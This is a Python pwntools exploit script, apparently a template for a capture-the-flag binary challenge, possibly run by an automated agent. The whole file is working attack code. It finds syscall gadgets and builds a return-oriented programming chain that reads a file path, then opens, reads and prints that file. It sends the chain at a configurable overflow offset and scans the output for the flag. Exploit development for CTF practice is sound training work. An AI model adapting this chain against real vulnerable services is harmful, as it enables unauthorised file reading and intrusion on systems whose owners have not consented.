#!/usr/bin/env python3
from pwn import *
import os, re

BIN = os.getenv("BIN", "./chall")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
OFFSET = int(os.getenv("OFFSET", "0"))  # TODO
FLAG_PATH = os.getenv("FLAG", "flag.txt").encode() + b"\x00"
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

elf = context.binary = ELF(BIN, checksec=False)
context.log_level = os.getenv("LOG", "info")


def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def scan(data: bytes):
    print(data.decode(errors="replace"))
    m = re.search(FLAG_RE, data)
    if m:
        flag = m.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


rop = ROP(elf)
# TODO: verify syscall gadgets with ctf-pwn-syscall-orw-check.
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
syscall = rop.find_gadget(["syscall", "ret"])[0]
bss = elf.bss(0x800)

chain = flat([
    pop_rax, 0, pop_rdi, 0, pop_rsi, bss, pop_rdx, 0x40, syscall,   # read(0,bss,...)
    pop_rax, 2, pop_rdi, bss, pop_rsi, 0, pop_rdx, 0, syscall,       # open(bss,0,0)
    pop_rax, 0, pop_rdi, 3, pop_rsi, bss + 0x100, pop_rdx, 0x100, syscall,
    pop_rax, 1, pop_rdi, 1, pop_rsi, bss + 0x100, pop_rdx, 0x100, syscall,
])

io = start()
io.sendline(flat({OFFSET: chain}))
io.send(FLAG_PATH)
scan(io.recvall(timeout=3))
